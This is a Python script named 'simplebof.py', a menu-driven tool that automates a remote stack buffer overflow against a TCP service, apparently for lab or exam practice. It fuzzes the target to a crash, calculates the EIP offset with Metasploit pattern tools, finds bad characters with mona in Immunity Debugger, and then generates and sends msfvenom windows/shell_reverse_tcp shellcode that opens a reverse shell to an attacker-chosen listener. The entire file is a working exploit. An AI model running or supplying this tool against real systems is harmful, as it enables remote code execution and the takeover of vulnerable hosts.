#!/bin/python3

import sys, socket, os, subprocess, re
from time import sleep

if len(sys.argv) < 3:
    print("usage: ./simplebof.py [ip] [port]")
    print("example: ./simplebof.py 127.0.0.1 4444")
    sys.exit()

#-----Global variables-----

cmd = ""
rhost = sys.argv[1]
rport = sys.argv[2]
crashbytes = ""
offset_value = ""
address = ""
final_badchars = "\\x00"

#-----Global variables-----

#-----Function START-----

def options_selection():
    selection=input("\nEnter your option to edit(1-7): ").strip()
    if selection == "1":
        global rhost 
        rhost = input("Enter new value: ").strip()
    elif selection == "2":
        global rport 
        rport = input("Enter new value: ").strip()
    elif selection == "3":
        global cmd
        cmd = input("Enter new value: ").strip()
    elif selection == "4":
        global offset_value
        offset_value = input("Enter new value: ").strip()
    elif selection == "5":
        global address
        address = input("Enter new value: ").strip()
    elif selection == "6":
        main_menu()
    elif selection == "7":
        clear()
        print("Goodbye...")
        sys.exit()
    else:
        print("Invalid selection.")
        main_menu_selection()
    options_menu()

def main_menu_selection():
    selection=input("\nEnter your selection(1-9): ").strip()
    if selection == "1":
        spike()
    elif selection == "2":
        fuzz()
    elif selection == "3":
        offset()
    elif selection == "4":
        test_offset()
    elif selection == "5":
        find_badchars()
    elif selection == "6":
        find_module()
    elif selection == "7":
        exploit()
    elif selection == "8":
        options_menu()
    elif selection == "9":
        clear()
        print("Goodbye...")
        sys.exit()
    else:
        print("Invalid selection.")
        main_menu_selection()
        
def spike():
    end_of_process_selection("spike","Work in Progress...")
    
def fuzz():
    global crashbytes
    
    check_variables("cmd")

    clear()

    buffer = b"A" * 100

    incremental = input("Input incremental range (Default: 100): ")
    if incremental == "":
        incremental = 100
    
    while True:
        try:
            payload = cmd.encode() + buffer
    
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(rhost),int(rport)))

            print ("[+] Sending the payload...\n" + str(len(buffer)))
            s.send(payload)
            s.settimeout(2)
            s.recv(2048)
            s.close()
            sleep(1)
            buffer = buffer + b"A" * int(incremental)
        
        except socket.timeout:
            if len(buffer) == 100:
                end_of_process_selection("fuzz","Error connecting to server")
            else:
                crashbytes = len(buffer) 
                end_of_process_selection("fuzz", f"The fuzzing crashed at {len(buffer)-int(incremental)} bytes")   
        except socket.error:
            end_of_process_selection("fuzz","Error connecting to server")
        except:
            sys.ext()

def offset():
    global offset_value

    clear()
    check_variables("cmd crashbytes")

    stream=os.popen(f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {crashbytes}")
    payload=stream.read().replace("\n", "")

    final_payload = cmd.encode() + payload.encode()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((rhost,int(rport)))
        
        print("Sending payload...")
        s.send(final_payload)
        s.close()

        clear()
        print("Check EIP address in Immunity.")
        eip = input("Please input EIP address: ")
        stream=os.popen(f"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {crashbytes} -q {eip}")
        out = stream.read()
        offset_value = out.split()[-1]
    except socket.error:
        print ("Error connecting to server")
    except TimeoutError:
        end_of_process_selection("offset","Wrong payload size")

    end_of_process_selection("offset", f"Offset is {offset_value}")

def test_offset():

    check_variables("offset cmd")

    payload = cmd.encode() + b"A" * int(offset_value) + b"B" * 4

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((rhost,int(rport)))
        s.send(payload)
        s.close()
    except socket.error:
        end_of_process_selection("test offset", "Error connecting to server")

    end_of_process_selection("test offset", "Done.\nCheck EIP contains 42424242")

def find_badchars():
    global final_badchars

    check_variables("offset cmd offset_value")

    new_badchars = set()
    current_badchars = "\\x00"

    try:
      clear()
      print(f"mona syntax: !mona bytearray -cpb \"{current_badchars}\"")
      input("\nSet default bytearray before continuing. Press enter to continue.\n")
      while True:
        badchars = ""
        for x in range(1,256): 
            if "{:02x}".format(x) not in new_badchars:
                badchars += ("{:02x}".format(x))

        shellcode = b"A" * int(offset_value) + b"B" * 4 + bytes.fromhex(badchars)
        payload = cmd.encode() + shellcode

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((rhost,int(rport)))
        s.send(payload)
        s.close()
      
        clear()
        print(f"mona syntax: !mona compare -f c:\\mona\\bytearray.bin -a <esp address>\n")
        
        while True:
            status = input("\nStatus Umodified?(y/n): ")
            if status.strip().lower() == "y":
                final_badchars = current_badchars
                end_of_process_selection("badchars",f"Bad characters: {final_badchars}")
            elif status.strip().lower() == "n":
                break
            else:
                print("Invalid choice")
        clear()

        print(f"Current bad characters: {current_badchars}")
        choice = input("\nAdd bad characters(e.g. 01 02 03)\nPlease restart immunity before adding new bad characters.\n\nInput: ")
        clear()
        if len(choice) != 0 and choice != 'x':
            for i in choice.split():
                new_badchars.add(i)
            current_badchars = "\\x00"
            for i in new_badchars: 
                current_badchars += ("\\x"+i) 
            print(f"\nBad characters: {str(current_badchars)}")  
            print(f"\nmona syntax: !mona bytearray -cpb \"{str(current_badchars)}\"")
            input("\nUpdate bytearray.bin before continuing. \nPlease ensure that immunity is running.\nPress enter to continue.\n")
            clear()
        else:
            print("Invalid choice/bad chracters")

    except KeyboardInterrupt:
        while True:
            clear()
            selection = input("Exit this function?(y/n)")
            if selection.strip().lower() == "y":
                end_of_process_selection("find_badchars")
            if selection.strip().lower() == "n":
                find_badchars()

    except socket.error:
        end_of_process_selection("badchars", "Error connecting to server")


def find_module():

    global address, final_badchars

    check_variables("cmd offset_value ")

    endian = ""

    clear()
    print("Identify module in Immunity")
    print("mona syntax: !mona modules\n")
    print("Find JMP address of modules")
    print("mona syntax: !mona jmp -r ESP -m \"<module>\"")
    print("\nExample:")
    print("usage: !mona modules")
    print("With process")
    print("usage: !mona jmp -r ESP -m \"essfunc.dll\"")
    print("With bad characters")
    print(f"usage: !mona jmp -r ESP -cpb \"{final_badchars}\"")
    address = input("\nPlease enter the address of the process/function: ")
    address_new = address

    temp = address

    while len(endian) < 8:
      endian += temp[-2:]
      temp = temp[:-2]
      
    clear()  
    print(f"\nLittle Endian Address: {endian}\n")
    input("Please make sure that immunity is running\nSet breakpoint to address\nPress enter to continue...")

    shellcode = b"A" * int(offset_value) + bytes.fromhex(endian)
    payload = cmd.encode() + shellcode

    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((sys.argv[1],int(sys.argv[2])))
      print("Sending Payload...")
      s.send((payload))
      s.close()
      while True:
            status = input("\nAmend bad characters?(y/n): ")
            if status.strip().lower() == "y":
                final_badchars = input("Enter new bad characters(\\x00\\x01\\x02): ")
                end_of_process_selection("find_module",f"Bad characters: {final_badchars}")
            elif status.strip().lower() == "n":
                break
            else:
                print("Invalid choice")
      end_of_process_selection("find_module",f"Done.\n\nCheck that program break at address {address}")
    except socket.error:
      end_of_process_selection("find_module","Error connecting to server")
    except KeyboardInterrupt:
      while True:
        clear()
        selection = input("Exit this function?(y/n)")
        if selection.strip().lower() == "y":
            end_of_process_selection("find_module")
        if selection.strip().lower() == "n":
            find_module()

def exploit():
    global final_badchars

    check_variables("cmd offset_value address")
    clear()

    endian = ""
    address_new = address
    badbytes = ""

    temp = address

    while len(endian) < 8:
      endian += temp[-2:]
      temp = temp[:-2]
      
    clear() 
    print("Creating payload...")
    msfpayload = "windows/shell_reverse_tcp"
    lhost = input("Listening Host: ")
    lport = input("Listening Port: ")

    while True:
        print(f"Bad Characters: {final_badchars}")
        amend_badbytes = input("Amend bad characters?(y/n): ")
        if amend_badbytes.strip().lower() == "y":
            badbytes_new = input("Enter bad characters(e.g. \\x00\\x01\\x02): ")
            if badbytes_new.strip() not in final_badchars:
                badbytes = badbytes_new
                final_badchars = badbytes_new
                break
            else:
                badbytes = final_badchars
                break
        elif amend_badbytes.strip().lower() == "n":
            badbytes = final_badchars
            break
        else:
            print("Invalid choice")

    print(f"\nmsfvenom -p {msfpayload.strip()} LHOST={lhost.strip()} LPORT={lport.strip()} EXITFUNC=thread -f c -b \"{badbytes.strip()}\"\n")
    stream=os.popen(f"msfvenom -p {msfpayload} LHOST={lhost.strip()} LPORT={lport.strip()} EXITFUNC=thread -f c -b \"{badbytes.strip()}\"")

    shell=stream.read().replace(";", "")
    shell=re.findall('"([^"]*)"', shell)

    overflow = ""

    for i in shell:
        overflow += i

    overflow = overflow.replace("\\","").replace('x',"")

    padding = input("\nPlease input padding size(recommend at least 8 bytes): ")

    shellcode = b"A" * int(offset_value) + bytes.fromhex(endian) + b"\x90" * int(padding) + bytes.fromhex(overflow)
    payload = cmd.encode() + shellcode

    clear()
    input("\nEnsure that listening port has been setup\nEnsure that immunity is running\nPress enter to continue...")

    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((rhost,int(rport)))
      print("Sending Payload...")
      s.send((payload))
      s.close()
      end_of_process_selection("exploit","Done.")
    except socket.error:
      end_of_process_selection("exploit","Error connecting to server")
    
def check_variables(i):
    global cmd,crashbytes,address,offset_value,final_badchars

    clear()

    if "crashbytes" in i and crashbytes == "":
        crashbytes = input("Enter payload size in byte: ")
    if "cmd" in i and cmd == "":
        cmd = input("Enter command,if any: ")
        if " " not in cmd.strip():
            cmd = cmd.strip() + " "
    if "offset" in i and offset_value == "":
        offset_value = input("Enter offset: ")
    if "address" in i and address == "":
        address = input("Please input jump address: ")

    clear()
    input("Ensure that Immunity is running before continuing...\nPress enter to continue...")

def end_of_process_selection(i,x=""):
    while True:
        clear()
        if x != "":
            print(f"{x}\n")
        selection = input("Press R to restart \nPress M to return to main menu\nPress X to exit\n")
        if selection.strip().lower() == "r":
            if i == "spike":
                spike()
            if i == "fuzz":
                fuzz()
            if i == "offset":
                offset()
            if i == "test offset":
                test_offset()
            if i == "badchars":
                find_badchars()
            if i == "find_module":
                find_module()
            if i == "exploit":
                exploit()
        elif selection.strip().lower() == "m":
            main_menu()
        elif selection.strip().lower() == "x":
            sys.exit()
            break
        else:
            print("Invalid Input")

def clear(): os.system("clear")

#-----Function END-----

#-----Menu START-----

def main_menu():
    clear()
    print("Welcome to Simple Buffer Overflow\n")
    print("1. Spike")
    print("2. Fuzz")
    print("3. Find offset")
    print("4. Test offset")
    print("5. Find bad character bytes")
    print("6. Find/Test module")
    print("7. Exploit")
    print("8. Options")
    print("9. Exit")
    main_menu_selection()

def options_menu():
    clear()
    print(f"1. Remote Host: {rhost}")
    print(f"2. Remote Port: {rport}")
    print(f"3. Vulnerable command, if any: {cmd}")
    print(f"4. Offset: {offset_value}")
    print(f"5. Address: {address}")
    print(f"6. Return to main menu")
    print(f"7. Exit")
    print(f"\nPayload crash at: {crashbytes}")
    print(f"\nBad characters: {final_badchars}")
    options_selection()

#-----Menu END-----

#-----MAIN START-----

main_menu()

#-----MAIN END-----
